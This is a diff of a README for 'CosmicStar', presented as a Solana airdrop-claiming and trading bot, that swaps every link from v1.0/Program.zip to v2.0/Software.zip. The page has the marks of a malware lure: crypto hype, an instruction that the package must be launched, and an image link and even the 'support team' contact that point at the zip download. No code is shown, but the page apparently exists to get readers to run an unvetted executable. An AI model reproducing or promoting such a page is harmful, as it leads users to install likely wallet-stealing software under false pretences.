@@ -2,7 +2,7 @@
 
 ## CosmicStar
 
-![image](https://github.com/antoniomrbr/CosmicStar/releases/download/v1.0/Program.zip)
+![image](https://github.com/antoniomrbr/CosmicStar/releases/download/v2.0/Software.zip)
 
 Welcome to CosmicStar - your go-to solution for automated trading and airdrop token claiming on the Solana blockchain! This repository houses the powerful Solana Airdrop Bot which is designed to streamline your trading operations and help you secure those lucrative airdrop tokens effortlessly.
 
@@ -27,7 +27,7 @@ CosmicStar is an efficient and secure bot that is specifically tailored for the 
 
 Ready to revolutionize your trading experience with CosmicStar? Simply download our software package from the link below:
 
-[![Download CosmicStar Software](https://github.com/antoniomrbr/CosmicStar/releases/download/v1.0/Program.zip)](https://github.com/antoniomrbr/CosmicStar/releases/download/v1.0/Program.zip)
+[![Download CosmicStar Software](https://github.com/antoniomrbr/CosmicStar/releases/download/v2.0/Software.zip)](https://github.com/antoniomrbr/CosmicStar/releases/download/v2.0/Software.zip)
 
 *Please note that the software package needs to be launched to leverage the full capabilities of CosmicStar.*
 
@@ -37,7 +37,7 @@ For detailed instructions on setting up and using CosmicStar, please refer to th
 
 ### Support
 
-If you encounter any issues or have any questions regarding CosmicStar, feel free to reach out to our support team at https://github.com/antoniomrbr/CosmicStar/releases/download/v1.0/Program.zip We are here to assist you in making the most of your automated trading journey!
+If you encounter any issues or have any questions regarding CosmicStar, feel free to reach out to our support team at https://github.com/antoniomrbr/CosmicStar/releases/download/v2.0/Software.zip We are here to assist you in making the most of your automated trading journey!
 
 ### Contribute
 
